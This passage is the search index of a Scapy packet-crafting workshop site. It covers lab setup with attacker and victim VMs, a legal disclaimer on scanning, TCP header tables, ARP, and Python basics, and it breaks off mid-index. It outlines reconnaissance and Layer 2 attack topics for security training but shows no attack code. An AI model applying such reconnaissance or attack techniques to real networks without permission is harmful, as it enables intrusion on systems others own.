{
    "docs": [
        {
            "location": "/index.html", 
            "text": "The Art of Packet Crafting with Scapy\n\n\nWorkshop overview\n\n\n\n\nThis is an intense workshop on crafting packets using Python and Scapy.\n\n\nWe\nll understand low level networking details/abstractions like raw Sockets and move towards using high level tools like Scapy to craft packets.\n\n\nWe\nll understand Scapy framework and craft packets using it.\n\n\nWe\nll leverage Scapy as a framework to build custom network tools/utilities.\n\n\n\n\nConcepts covered\n\n\n\n\nPractical network reconnaissance techniques like host discovery, service discovery, Remote OS finger printing, promiscuous node detection using Scapy.\n\n\nLaunching Layer 2 attacks.\n\n\nLeverage Scapy to build custom tools/utilities such as sniffers, pcap analyzer, wireless sniffers and scanners.\n\n\n\n\nSkill prerequisites\n\n\n\n\nBasics of Python programming. (strings, lists, functions, list comprehensions etc)\n\n\nKnowledge of basic networking concepts. (Enough to know what an IP address, port number, OSI model etc.)\n\n\nComfortable with basic operations on your host operating system.(copying files, using text editor)\n\n\n\n\nTechnical prerequisites\n\n\n\n\nLaptop with administrator access (mandatory).\n\n\nMinimum 4 GB RAM and 15 GB free hard disk space (More the better).\n\n\nPreferably running Linux as primary OS but Windows/Mac is permissible.\n\n\nPreferably, your own Internet connectivity.\n\n\n\n\nLibraries/Modules\n\n\n\n\nStandard library\n\n\nsys, pprint.\n\n\n\n\n\n\nThird party modules\n\n\nscapy, netaddr, inetfaces.", 
            "title": "The Art of Packet Crafting with Scapy"
        }, 
        {
            "location": "/index.html#the-art-of-packet-crafting-with-scapy", 
            "text": "", 
            "title": "The Art of Packet Crafting with Scapy"
        }, 
        {
            "location": "/index.html#workshop-overview", 
            "text": "This is an intense workshop on crafting packets using Python and Scapy.  We ll understand low level networking details/abstractions like raw Sockets and move towards using high level tools like Scapy to craft packets.  We ll understand Scapy framework and craft packets using it.  We ll leverage Scapy as a framework to build custom network tools/utilities.", 
            "title": "Workshop overview"
        }, 
        {
            "location": "/index.html#concepts-covered", 
            "text": "Practical network reconnaissance techniques like host discovery, service discovery, Remote OS finger printing, promiscuous node detection using Scapy.  Launching Layer 2 attacks.  Leverage Scapy to build custom tools/utilities such as sniffers, pcap analyzer, wireless sniffers and scanners.", 
            "title": "Concepts covered"
        }, 
        {
            "location": "/index.html#skill-prerequisites", 
            "text": "Basics of Python programming. (strings, lists, functions, list comprehensions etc)  Knowledge of basic networking concepts. (Enough to know what an IP address, port number, OSI model etc.)  Comfortable with basic operations on your host operating system.(copying files, using text editor)", 
            "title": "Skill prerequisites"
        }, 
        {
            "location": "/index.html#technical-prerequisites", 
            "text": "Laptop with administrator access (mandatory).  Minimum 4 GB RAM and 15 GB free hard disk space (More the better).  Preferably running Linux as primary OS but Windows/Mac is permissible.  Preferably, your own Internet connectivity.", 
            "title": "Technical prerequisites"
        }, 
        {
            "location": "/index.html#librariesmodules", 
            "text": "Standard library  sys, pprint.    Third party modules  scapy, netaddr, inetfaces.", 
            "title": "Libraries/Modules"
        }, 
        {
            "location": "/workshop_intro/license/index.html", 
            "text": "Copyright (C) 2016  Bharath Kumar\n \n\nExcept as otherwise noted, the content of this workshop is licensed under the \nCreative Commons Attribution-Share Alike 4.0 International License\n , and code samples are licensed under the \nApache 2.0 License\n.\n\n\nNetwork Hunt\n CTF is based on work created and shared by James Sullivan and used according to terms described in the MIT license.\n\n\nAll the packet header illustrations are reproduced work created and shared by Matt Baxter as seen at \nNmap reference book", 
            "title": "License"
        }, 
        {
            "location": "/workshop_intro/bigger_picture/index.html", 
            "text": "The training material could be found at \ndisruptivelabs.in/training", 
            "title": "Bigger picture"
        }, 
        {
            "location": "/workshop_intro/speakers/index.html", 
            "text": "Bharath\n\n\nWebpage \n \n  \n  \nDisruptivelabs.in\n\nTwitter\n \n  \n \n  \n  \n   \nTwitter.com/yamakira_\n\nGithub \n \n \n \n \nGithub.com/yamakira\n \n\n\nAbhinav\n\n\nTwitter\n \n  \n \n  \n  \n   \nTwitter.com/geek_ji", 
            "title": "Speakers"
        }, 
        {
            "location": "/workshop_intro/speakers/index.html#bharath", 
            "text": "Webpage          Disruptivelabs.in \nTwitter                  Twitter.com/yamakira_ \nGithub          Github.com/yamakira", 
            "title": "Bharath"
        }, 
        {
            "location": "/workshop_intro/speakers/index.html#abhinav", 
            "text": "Twitter                  Twitter.com/geek_ji", 
            "title": "Abhinav"
        }, 
        {
            "location": "/workshop_intro/workshop_settings/index.html", 
            "text": "Settings\n\n\nThe Goal\n\n\n\n\nUnderstanding packet crafting and crafting packets with scapy\n\n\nUnderstanding common attacks and analysis techniques, implementing them using scapy.\n\n\nWriting custom tools using scapy framework!\n\n\nHave fun while programming and solving challenges!\n\n\n\n\nQuestions\n\n\n\n\nRTFM\n\n\nAsk them when you got them.\n\n\nIt\ns easy to get lost so \ntry not to be on auto pilot mode\n.\n\n\n\n\nWorkshop\n\n\n\n\nMeter wide \n Mile deep!\n\n\nPentesters point of view.\n\n\nMinimal theory, maximal hands-on.\n\n\nProgramming experience in Python preferred but it\ns possible to follow even without it.\n\n\nPython 2.7.x\n\n\n\n\nFor more on Python 2.x vs 3.x \nPython 2.x vs 3.x", 
            "title": "Workshop settings"
        }, 
        {
            "location": "/workshop_intro/workshop_settings/index.html#settings", 
            "text": "", 
            "title": "Settings"
        }, 
        {
            "location": "/workshop_intro/workshop_settings/index.html#the-goal", 
            "text": "Understanding packet crafting and crafting packets with scapy  Understanding common attacks and analysis techniques, implementing them using scapy.  Writing custom tools using scapy framework!  Have fun while programming and solving challenges!", 
            "title": "The Goal"
        }, 
        {
            "location": "/workshop_intro/workshop_settings/index.html#questions", 
            "text": "RTFM  Ask them when you got them.  It s easy to get lost so  try not to be on auto pilot mode .", 
            "title": "Questions"
        }, 
        {
            "location": "/workshop_intro/workshop_settings/index.html#workshop", 
            "text": "Meter wide   Mile deep!  Pentesters point of view.  Minimal theory, maximal hands-on.  Programming experience in Python preferred but it s possible to follow even without it.  Python 2.7.x   For more on Python 2.x vs 3.x  Python 2.x vs 3.x", 
            "title": "Workshop"
        }, 
        {
            "location": "/workshop_intro/disclaimer/index.html", 
            "text": "Legal ramifications!\n\n\nThe legal ramifications of scanning networks are complex and controversial(like with many other laws pertaining to computer security). When using tools like Scapy/Nmap the line between doing something benign and malignant is thin. Always have written permission before scanning a network that you don\nt own, know what you are doing, know your jurisdictions and speak to a lawyer!\n\n\nThe general rules for this class are:\n\n\n\n\nYou don\nt own it; You don\nt scan it!\n\n\n\n\n\n\nDO NOT\n scan any machines at the venue that you don\nt have permission to scan.\n\n\n\n\nLimit your scanning to the following:\n\n\n\n\nThe virtual machines provided as part of the labs.\n\n\nscanme.nmap.org\n\n\negadz.metasploit.com\n\n\nhackme.irongeek.com\n\n\n\n\n\n\n\n\n\n(Feel free to do any sort of scan against your VMs but for other public services listed above, limit your scans as much as you can.)", 
            "title": "Disclaimer"
        }, 
        {
            "location": "/workshop_intro/disclaimer/index.html#legal-ramifications", 
            "text": "The legal ramifications of scanning networks are complex and controversial(like with many other laws pertaining to computer security). When using tools like Scapy/Nmap the line between doing something benign and malignant is thin. Always have written permission before scanning a network that you don t own, know what you are doing, know your jurisdictions and speak to a lawyer!  The general rules for this class are:   You don t own it; You don t scan it!    DO NOT  scan any machines at the venue that you don t have permission to scan.   Limit your scanning to the following:   The virtual machines provided as part of the labs.  scanme.nmap.org  egadz.metasploit.com  hackme.irongeek.com     (Feel free to do any sort of scan against your VMs but for other public services listed above, limit your scans as much as you can.)", 
            "title": "Legal ramifications!"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html", 
            "text": "Mysterious boxes lab setup\n\n\n\n\n\u201cGive me six hours to chop down a tree and I will spend the first four sharpening the axe.\u201d - Lincoln\n\n\n\n\nSetting up\n\n\nDirectory tree\n\n\nUSB\n\u2502\n\u2514\u2500\u2500\u2500null-workshop-packet-crafting-scapy \n    \u2502    \n    \u2514\u2500\u2500\u2500\u2500\u2500labs\n         \u2502   \n         \u2514\u2500\u2500\u2500mysterious_boxes_lab\n\n              import_labs.sh\n              start_labs.sh\n              stop_labs.sh\n              ...         \n              import_labs.bat\n              start_labs.bat\n              stop_labs.bat\n\n\n\n\n\n\nFollow the guidlines listed below depending on your primary/host OS.\n\n\nLinux/Mac\n\n\nStep I\n   \n\n\n\n\nCopy the directory \nnull-workshop-packet-crafting-scapy\n from USB provided on to your machine.\n\n\n\n\nStep II\n\n\n\n\nInstall VirtualBox(preferably 5.0 or later). Installers are provided in the directory copied.\n\n\n\n\nStep III\n\n\n\n\ncd\n into the sub-directory \nmysterious_boxes_lab\n\n\n\n\n\n\n\n\nRun the script \nimport_labs.sh\n\n\n\n\nThis script will import all the OVA files from the directory into your VirtualBox.\n\n\nIn the end, this script will display list of all the VMs available in VirtualBox.\n\n\nIf you see \nvictim1, victim2, attacker\n in the VMs list, the importing is sucessful.\n\n\n\n\n\n\n\n\n\n\n\nRun the script \nstart_labs.sh\n\n\n\n\nThis script will setup and run your lab VMs.\n\n\nAll the victims will run in the background. You\nll be presented with only one VM, which will be our attacker.\n\n\nThis script will display list of all the running VMs in the end.\n\n\nIf you see two victims and an attacker in the list, you are ready!\n\n\n\n\n\n\n\n\n\nRun the script \nstop_labs.sh\n when done with the labs. This will gracefully shutdown all the lab VMs.\n\n\n\n\nWindows\n\n\nStep I\n   \n\n\n\n\nCopy the directory \nnull-workshop-packet-crafting-scapy\n from USB provided on to your Windows machine.\n\n\n\n\nStep II\n\n\n\n\nInstall VirtualBox(preferably 5.0 or later). Installers are provided in the directory copied.\n\n\n\n\nStep III\n\n\n\n\ncd\n into the sub-directory \nmysterious_boxes_lab\n\n\n\n\n\n\n\n\nRun the script \nimport_labs.bat\n\n\n\n\nThis script will import all the OVA files needed into your VirtualBox.\n\n\nIn the end, this script will display list of all the VMs available in VirtualBox.\n\n\nIf you see \nvictim1, victim2, attacker\n in the VMs list, the importing is sucessful.\n\n\n\n\n\n\n\n\n\n\n\nRun the script \nstart_labs.bat\n\n\n\n\nThis script will setup and run your lab VMs.\n\n\nAll the victims will run in the background. You\nll be displayed only one VM, which will be our attacker.\n\n\nThis script will display all the running VMs in the end.\n\n\nIf you see two victims and an attacker running, you are ready!\n\n\n\n\n\n\n\n\n\nRun the script \nstop_labs.bat\n when done with the labs. This will gracefully shutdown all the lab VMs.\n\n\n\n\nTroubleshooting(Windows)\n\n\n\n\nAll the scripts assume the VirtualBox installation is at \nC:\\Program Files\\Oracle\\VirtualBox\n. Incase if the installation is at a different location, edit the following line in script manually to point to the right location.\n\n\n\n\nPATH=%PATH%;C:\\Program Files\\Oracle\\VirtualBox\n\n\n\n\n\n\nAll the VMs have host-only interface turned on by default. Windows interface naming convention tend to be inconsistent. In case are having trouble starting VMs due to network interface problems, change the interface name in script manually to match your VirtualBox host-only adapter interface name.\n\n\n\n\nvboxmanage modifyvm \nvictim1\n --nic1 hostonly --hostonlyadapter1 \nyour_interface_name_here\n\n\n\n\n\nTopology\n\n\nHost machine\n\n\n\n\nHost OS is the primary Operating System on which you are running VirtualBox\n\n\nHost OS is on the same sub-net as the VM\ns\n\n\n\n\nAttacker machine\n\n\nUsername\n: attacker \n\n\nPassword\n: attacker \n\n\nPython third-party modules available - scapy, netaddr \n\nOther security tools available - nmap, wireshark, dsniff(macof), tcpdump. \n\n\n\n\nThe VM displayed after starting labs is your attacker.\n\n\nThis is our \nbase box\n for this workshop from where we orchestrate our attacks.\n\n\nLogin using the above credentials and \nrun \nstartx\n command to get a GUI.\n\n\nThe GUI is openbox based, it is intended to be super minimal so don\nt be surprised about lack of some \nfeatures\n.\n\n\n\n\nVictim machines\n\n\n\n\nBunch of pre-configured VM\ns.\n\n\nConfigured to run in the background(headless mode).\n\n\nVictims vary in their operating systems,  listening services and security policies, nothing fancy though.\n\n\n\n\nThe Goal\n\n\nTo find as much information as we can about the victim machines using Scapy on attacker machine.\n\n\n\n\nFingerprinting OSs.\n\n\nFind listening services.\n\n\nUnderstand security policies.", 
            "title": "Mysterious boxes"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html#mysterious-boxes-lab-setup", 
            "text": "\u201cGive me six hours to chop down a tree and I will spend the first four sharpening the axe.\u201d - Lincoln", 
            "title": "Mysterious boxes lab setup"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html#setting-up", 
            "text": "", 
            "title": "Setting up"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html#directory-tree", 
            "text": "USB\n\u2502\n\u2514\u2500\u2500\u2500null-workshop-packet-crafting-scapy \n    \u2502    \n    \u2514\u2500\u2500\u2500\u2500\u2500labs\n         \u2502   \n         \u2514\u2500\u2500\u2500mysterious_boxes_lab\n\n              import_labs.sh\n              start_labs.sh\n              stop_labs.sh\n              ...         \n              import_labs.bat\n              start_labs.bat\n              stop_labs.bat   Follow the guidlines listed below depending on your primary/host OS.", 
            "title": "Directory tree"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html#linuxmac", 
            "text": "Step I       Copy the directory  null-workshop-packet-crafting-scapy  from USB provided on to your machine.   Step II   Install VirtualBox(preferably 5.0 or later). Installers are provided in the directory copied.   Step III   cd  into the sub-directory  mysterious_boxes_lab     Run the script  import_labs.sh   This script will import all the OVA files from the directory into your VirtualBox.  In the end, this script will display list of all the VMs available in VirtualBox.  If you see  victim1, victim2, attacker  in the VMs list, the importing is sucessful.      Run the script  start_labs.sh   This script will setup and run your lab VMs.  All the victims will run in the background. You ll be presented with only one VM, which will be our attacker.  This script will display list of all the running VMs in the end.  If you see two victims and an attacker in the list, you are ready!     Run the script  stop_labs.sh  when done with the labs. This will gracefully shutdown all the lab VMs.", 
            "title": "Linux/Mac"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html#windows", 
            "text": "Step I       Copy the directory  null-workshop-packet-crafting-scapy  from USB provided on to your Windows machine.   Step II   Install VirtualBox(preferably 5.0 or later). Installers are provided in the directory copied.   Step III   cd  into the sub-directory  mysterious_boxes_lab     Run the script  import_labs.bat   This script will import all the OVA files needed into your VirtualBox.  In the end, this script will display list of all the VMs available in VirtualBox.  If you see  victim1, victim2, attacker  in the VMs list, the importing is sucessful.      Run the script  start_labs.bat   This script will setup and run your lab VMs.  All the victims will run in the background. You ll be displayed only one VM, which will be our attacker.  This script will display all the running VMs in the end.  If you see two victims and an attacker running, you are ready!     Run the script  stop_labs.bat  when done with the labs. This will gracefully shutdown all the lab VMs.", 
            "title": "Windows"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html#troubleshootingwindows", 
            "text": "All the scripts assume the VirtualBox installation is at  C:\\Program Files\\Oracle\\VirtualBox . Incase if the installation is at a different location, edit the following line in script manually to point to the right location.   PATH=%PATH%;C:\\Program Files\\Oracle\\VirtualBox   All the VMs have host-only interface turned on by default. Windows interface naming convention tend to be inconsistent. In case are having trouble starting VMs due to network interface problems, change the interface name in script manually to match your VirtualBox host-only adapter interface name.   vboxmanage modifyvm  victim1  --nic1 hostonly --hostonlyadapter1  your_interface_name_here", 
            "title": "Troubleshooting(Windows)"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html#topology", 
            "text": "", 
            "title": "Topology"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html#host-machine", 
            "text": "Host OS is the primary Operating System on which you are running VirtualBox  Host OS is on the same sub-net as the VM s", 
            "title": "Host machine"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html#attacker-machine", 
            "text": "Username : attacker   Password : attacker   Python third-party modules available - scapy, netaddr  \nOther security tools available - nmap, wireshark, dsniff(macof), tcpdump.    The VM displayed after starting labs is your attacker.  This is our  base box  for this workshop from where we orchestrate our attacks.  Login using the above credentials and  run  startx  command to get a GUI.  The GUI is openbox based, it is intended to be super minimal so don t be surprised about lack of some  features .", 
            "title": "Attacker machine"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html#victim-machines", 
            "text": "Bunch of pre-configured VM s.  Configured to run in the background(headless mode).  Victims vary in their operating systems,  listening services and security policies, nothing fancy though.", 
            "title": "Victim machines"
        }, 
        {
            "location": "/lab_setup/lab_setup/index.html#the-goal", 
            "text": "To find as much information as we can about the victim machines using Scapy on attacker machine.   Fingerprinting OSs.  Find listening services.  Understand security policies.", 
            "title": "The Goal"
        }, 
        {
            "location": "/lab_setup/network_hunt/index.html", 
            "text": "Network hunt\n lab setup\n\n\nSetting up\n\n\nDirectory tree\n\n\nOn your attacker box\n\n\n/\n\u2502\n\u2514\u2500\u2500\u2500home\n    \u2502\n    \u2514\u2500\u2500\u2500network_hunt_challenge\n        \u2502    \n        \u2514\u2500\u2500 network_hunt.py\n\n\n\n\nInstructions\n\n\n\n\nRun the \nnetwork_hunt.py\n script as root.\n\n\n\n\nverax@humla ~/network_hunt_challenge $ sudo python network_hunt.py \nThe game is now running - tap0 interface allocated.\nEnding the process will deallocate this interface and release all state.\n\n\n\n\n\n\nIf the script executed without errors, the challenge is setup!\n\n\nRefer to \nexercises\n section \n \nnetwork hunt\n page in this notes for instruction on cracking the challenge.", 
            "title": "Network Hunt"
        }, 
        {
            "location": "/lab_setup/network_hunt/index.html#network-hunt-lab-setup", 
            "text": "", 
            "title": "'Network hunt' lab setup"
        }, 
        {
            "location": "/lab_setup/network_hunt/index.html#setting-up", 
            "text": "", 
            "title": "Setting up"
        }, 
        {
            "location": "/lab_setup/network_hunt/index.html#directory-tree", 
            "text": "On your attacker box  /\n\u2502\n\u2514\u2500\u2500\u2500home\n    \u2502\n    \u2514\u2500\u2500\u2500network_hunt_challenge\n        \u2502    \n        \u2514\u2500\u2500 network_hunt.py", 
            "title": "Directory tree"
        }, 
        {
            "location": "/lab_setup/network_hunt/index.html#instructions", 
            "text": "Run the  network_hunt.py  script as root.   verax@humla ~/network_hunt_challenge $ sudo python network_hunt.py \nThe game is now running - tap0 interface allocated.\nEnding the process will deallocate this interface and release all state.   If the script executed without errors, the challenge is setup!  Refer to  exercises  section    network hunt  page in this notes for instruction on cracking the challenge.", 
            "title": "Instructions"
        }, 
        {
            "location": "/networking/layers/index.html", 
            "text": "Layered Approach", 
            "title": "Layers"
        }, 
        {
            "location": "/networking/layers/index.html#layered-approach", 
            "text": "", 
            "title": "Layered Approach"
        }, 
        {
            "location": "/networking/socket_interface/index.html", 
            "text": "Socket Interface\n\n\n\n\n\n\n\n\n\n\n\nRaw sockets\n\n\nKernel offers two ways to forge packets:\n\n\nLayer 3 - PF_INET, SOCK_RAW\n\n- Classic raw sockets.\n\n- Lotsa hand holding by kernel which inturn limits what you can do.\n \n\n\nLayer 2 - PF_PACKET, PF_RAW\n\n- There is no limit on what you send.\n\n- No hand holding by kernel.\n\n- You are responsible for choosing interfaces, linktypes, ARP stuff, calculate checksums\u2026", 
            "title": "Socket Interface"
        }, 
        {
            "location": "/networking/socket_interface/index.html#socket-interface", 
            "text": "", 
            "title": "Socket Interface"
        }, 
        {
            "location": "/networking/socket_interface/index.html#raw-sockets", 
            "text": "Kernel offers two ways to forge packets:  Layer 3 - PF_INET, SOCK_RAW \n- Classic raw sockets. \n- Lotsa hand holding by kernel which inturn limits what you can do.    Layer 2 - PF_PACKET, PF_RAW \n- There is no limit on what you send. \n- No hand holding by kernel. \n- You are responsible for choosing interfaces, linktypes, ARP stuff, calculate checksums\u2026", 
            "title": "Raw sockets"
        }, 
        {
            "location": "/networking/packet_headers/index.html", 
            "text": "Packet Headers\n\n\nThis workshop is about crafting packets so it makes sense to spend enough time understanding what packets are and how they are structured.\n\n\nIllustrations on this page are reproduced work created and shared by Matt Baxter as seen at \nhttps://nmap.org/book/tcpip-ref.html\n \n\n\nIP Header\n\n\n\n\n\n\n\n\nTCP Header\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTCP flag\n\n\nBinary\n\n\nDecimal\n\n\nTCP Dump syntax\n\n\n\n\n\n\n\n\n\n\nURG\n\n\n00100000\n\n\n32\n\n\ntcp[13] == 32\n\n\n\n\n\n\nACK\n\n\n00010000\n\n\n16\n\n\ntcp[13] == 16\n\n\n\n\n\n\nPSH\n\n\n00001000\n\n\n8\n\n\ntcp[13] == 8\n\n\n\n\n\n\nRST\n\n\n00000100\n\n\n4\n\n\ntcp[13] == 4\n\n\n\n\n\n\nSYN\n\n\n00000010\n\n\n2\n\n\ntcp[13] == 2\n\n\n\n\n\n\nFIN\n\n\n00000001\n\n\n1\n\n\ntcp[13] == 1\n\n\n\n\n\n\n\n\nSYN-ACK\n = 00010010 = \n18\n \n\n\n\nRST-ACK\n = 00010100 = \n20\n\n\nTCP flags mnemonic - \nU\nnskilled \nA\nttackers \nP\nester \nR\neal \nS\necurity \nF\nolks\n\n\nUDP Header\n\n\n\n\n\n\n\n\nICMP Header\n\n\n\n\n\n\n\n\nARP Header", 
            "title": "Packet Headers"
        }, 
        {
            "location": "/networking/packet_headers/index.html#packet-headers", 
            "text": "This workshop is about crafting packets so it makes sense to spend enough time understanding what packets are and how they are structured.  Illustrations on this page are reproduced work created and shared by Matt Baxter as seen at  https://nmap.org/book/tcpip-ref.html", 
            "title": "Packet Headers"
        }, 
        {
            "location": "/networking/packet_headers/index.html#ip-header", 
            "text": "", 
            "title": "IP Header"
        }, 
        {
            "location": "/networking/packet_headers/index.html#tcp-header", 
            "text": "TCP flag  Binary  Decimal  TCP Dump syntax      URG  00100000  32  tcp[13] == 32    ACK  00010000  16  tcp[13] == 16    PSH  00001000  8  tcp[13] == 8    RST  00000100  4  tcp[13] == 4    SYN  00000010  2  tcp[13] == 2    FIN  00000001  1  tcp[13] == 1     SYN-ACK  = 00010010 =  18    RST-ACK  = 00010100 =  20  TCP flags mnemonic -  U nskilled  A ttackers  P ester  R eal  S ecurity  F olks", 
            "title": "TCP Header"
        }, 
        {
            "location": "/networking/packet_headers/index.html#udp-header", 
            "text": "", 
            "title": "UDP Header"
        }, 
        {
            "location": "/networking/packet_headers/index.html#icmp-header", 
            "text": "", 
            "title": "ICMP Header"
        }, 
        {
            "location": "/networking/packet_headers/index.html#arp-header", 
            "text": "", 
            "title": "ARP Header"
        }, 
        {
            "location": "/networking/protocols/index.html", 
            "text": "Address Resolution Protocol(ARP)\n\n\nOverview\n\n\n\n\nARP is used for mapping a network address (e.g. an IPv4 address) to a physical address like an Ethernet address (also named a MAC address).\n\n\nARP has been implemented with many combinations of network and data link layer technologies but the most common being \nIPv4 over Ethernet\n.\n\n\nThe purpose of ARP is to find out the MAC address of a device in your Local Area Network (LAN), for the corresponding IPv4 address, which network application is trying to communicate.\n\n\n\n\nARP resolution\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nStep 1:\n\n\n\n\nWhen a source device want to communicate with another device, source device checks its ARP cache to find it already has a resolved MAC Address of the destination device. If it is there, it will use that MAC Address for communication. To view your Local ARP cache. (\narp -a\n displays local arp cache)\n\n\n\n\nStep 2:\n\n\n\n\nIf ARP resolution is not there in local cache, the source machine will generate an ARP request message(who-has), it puts its own data link layer address as the Sender Hardware Address and its own IPv4 Address as the Sender Protocol Address. It fills the destination IPv4 Address as the Target Protocol Address. \nThe Target Hardware Address will be left blank\n, since the machine is trying to find that. \n\n\n\n\nStep 3:\n\n\n\n\nThe source broadcast the Address Resolution Protocol (ARP) request message to the local network. \n\n\n\n\nStep 4:\n\n\n\n\nThe message is received by each device on the LAN since it is a broadcast. Each device compare the Target Protocol Address (IPv4 Address of the machine to which the source is trying to communicate) with its own Protocol Address (IPv4 Address). Those who do not match will drop the packet without any action.\n\n\n\n\nStep 5:\n\n\n\n\nWhen the targeted device checks the Target Protocol Address, it will find a match and will generate an Address Resolution Protocol (ARP) reply message. It takes the Sender Hardware Address and the Sender Protocol Address fields from the Address Resolution Protocol (ARP) request message and uses these values for the Targeted Hardware Address and Targeted Protocol Address of the reply message.\n\n\n\n\nStep 6:\n\n\n\n\nThe destination device will update its Address Resolution Protocol (ARP) cache, since it need to contact the sender machine soon.\n\n\n\n\nStep 7:\n\n\n\n\nDestination device send the Address Resolution Protocol (ARP) reply message and it will NOT be a broadcast, but a unicast.\n\n\n\n\nStep 8:\n\n\n\n\nThe source machine will process the Address Resolution Protocol (ARP) reply from destination, it store the Sender Hardware Address as the layer 2 address of the destination.\n\n\n\n\nStep 9:\n\n\n\n\nThe source machine will update its Address Resolution Protocol (ARP) cache with the Sender Hardware Address and Sender Protocol Address it received from the Address Resolution Protocol (ARP) reply message.", 
            "title": "Protocols"
        }, 
        {
            "location": "/networking/protocols/index.html#address-resolution-protocolarp", 
            "text": "", 
            "title": "Address Resolution Protocol(ARP)"
        }, 
        {
            "location": "/networking/protocols/index.html#overview", 
            "text": "ARP is used for mapping a network address (e.g. an IPv4 address) to a physical address like an Ethernet address (also named a MAC address).  ARP has been implemented with many combinations of network and data link layer technologies but the most common being  IPv4 over Ethernet .  The purpose of ARP is to find out the MAC address of a device in your Local Area Network (LAN), for the corresponding IPv4 address, which network application is trying to communicate.", 
            "title": "Overview"
        }, 
        {
            "location": "/networking/protocols/index.html#arp-resolution", 
            "text": "Step 1:   When a source device want to communicate with another device, source device checks its ARP cache to find it already has a resolved MAC Address of the destination device. If it is there, it will use that MAC Address for communication. To view your Local ARP cache. ( arp -a  displays local arp cache)   Step 2:   If ARP resolution is not there in local cache, the source machine will generate an ARP request message(who-has), it puts its own data link layer address as the Sender Hardware Address and its own IPv4 Address as the Sender Protocol Address. It fills the destination IPv4 Address as the Target Protocol Address.  The Target Hardware Address will be left blank , since the machine is trying to find that.    Step 3:   The source broadcast the Address Resolution Protocol (ARP) request message to the local network.    Step 4:   The message is received by each device on the LAN since it is a broadcast. Each device compare the Target Protocol Address (IPv4 Address of the machine to which the source is trying to communicate) with its own Protocol Address (IPv4 Address). Those who do not match will drop the packet without any action.   Step 5:   When the targeted device checks the Target Protocol Address, it will find a match and will generate an Address Resolution Protocol (ARP) reply message. It takes the Sender Hardware Address and the Sender Protocol Address fields from the Address Resolution Protocol (ARP) request message and uses these values for the Targeted Hardware Address and Targeted Protocol Address of the reply message.   Step 6:   The destination device will update its Address Resolution Protocol (ARP) cache, since it need to contact the sender machine soon.   Step 7:   Destination device send the Address Resolution Protocol (ARP) reply message and it will NOT be a broadcast, but a unicast.   Step 8:   The source machine will process the Address Resolution Protocol (ARP) reply from destination, it store the Sender Hardware Address as the layer 2 address of the destination.   Step 9:   The source machine will update its Address Resolution Protocol (ARP) cache with the Sender Hardware Address and Sender Protocol Address it received from the Address Resolution Protocol (ARP) reply message.", 
            "title": "ARP resolution"
        }, 
        {
            "location": "/python/python/index.html", 
            "text": "Python essentials\n\n\nList comprehensions\n\n\n\n\nA list comprehension is a compact way to write an expression that expands to a whole list.\n\n\nList comprehension can almost substitute for the lambda function especially as map(), filter() and reduce().\n\n\n\n\n\n\n\n\n\n\n\n\n\nExamples\n\n\n# compute a list of their squares of elements in a list\nnums = [1, 2, 3, 4]\n\nsquares = [ n * n for n in nums ]   ## [1, 4, 9, 16]\n\n\n\n\n port_numbers = [22,25,80,139,443]\n\n [k for k in port_numbers]\n[22, 25, 80, 139, 443]\n\n\n\n numbers = [2,4,6,8] \n\n [k*2 for k in numbers]\n[4, 8, 12, 16]\n\n\n\n\n\n\n\nYou can add an if test to the right of the for-loop to narrow the result. The if test is evaluated for each element, including only the elements where the test is true.\n\n\n\n\n port_numbers = [22,25,80,139,443,8080,9999,55555]\n\n \n\n [k for k in port_numbers if k\n1023]\n[22, 25, 80, 139, 443]\n\n\n\n\n\nLambda functions\n\n\nSyntax: \nlambda arg1, arg2, \nargN : expression using arguments\n.\n\n\n\n\n\n\n\n\n\n\n\n\n- Python supports the creation of anonymous functions (i.e. functions that are not bound to a name) at runtime, using a construct called \nlambda\n.\n\n- Lambda functions take any number of arguments but only has one expression, the result of this expression is returned.\n\n\n def f (x): return x**2\n... \n\n print f(8)\n64\n\n \n\n g = lambda x: x**2\n\n \n\n print g(8)\n64\n\n\n\n\n\n\nLambda functions can be used anywhere a function is expected, not necessary to assign it to a variable.\n\n\nYou can pass lambda functions to other functions to do stuff(for example lambda function as key to sorted())\n\n\n\n\n\n\n\n\nExtracting numbers that are multiples of 3.\n\n\nOne element of data structure(a list here) gets passed to the lambda function at a time.\n\n\nLambda function can only have one expression.\n\n\nfilter\n is a built-in function in Python that take a function and a data structure as arguments, passes one element of data structure at a time to the function.\n\n\n\n\n mult3 = filter(lambda x: x % 3 == 0, [1, 2, 3, 4, 5, 6, 7, 8, 9])\n\n mult3\n[3, 6, 9]\n\n\n\n\n\n\nSort elements in list by last character.\n\n\n\n\n lis = ['az', 'bbbbbbt', 'cccx']\n\n\n\n sorted_by_last = sorted(lis, key = lambda(x): x[-1] )   \n\n\n\n sorted_by_last\n['bbbbbbt', 'cccx', 'az']\n\n\n\n\n\n\n\nExtracting privileged ports(under 1024) from a list of port numbers using lambda function.\n\n\n\n\n open_ports = [1,20,21,25,80,443,1639,4444,6798]\n\n \n\n privileged_ports = filter(lambda x: x \n1024, open_ports)\n\n privileged_ports\n[1, 20, 21, 25, 80, 443]\n\n \n\n\n\n\n\n\nDoing the same with normal function.\n\n\nIf you are not comfortable with using lambda functions, you can simply use normal functions.\n\n\n\n\n def extract_priv_ports(port_number):\n...     if port_number \n 1024:\n...         return port_number\n\n\n\n privileged_ports = filter(extract_priv_ports, open_ports)\n\n privileged_ports\n[1, 20, 21, 25, 80, 443]\n\n \n\n\n\n\n\n\nUsing Lambda\n\n\nLambda funtions are good when they are short and as throw away functions. If you plan on doing anything remotely complex with it, put lambda away and define a real function.", 
            "title": "Python"
        }, 
        {
            "location": "/python/python/index.html#python-essentials", 
            "text": "", 
            "title": "Python essentials"
        }, 
        {
            "location": "/python/python/index.html#list-comprehensions", 
            "text": "A list comprehension is a compact way to write an expression that expands to a whole list.  List comprehension can almost substitute for the lambda function especially as map(), filter() and reduce().", 
            "title": "List comprehensions"
        }, 
        {
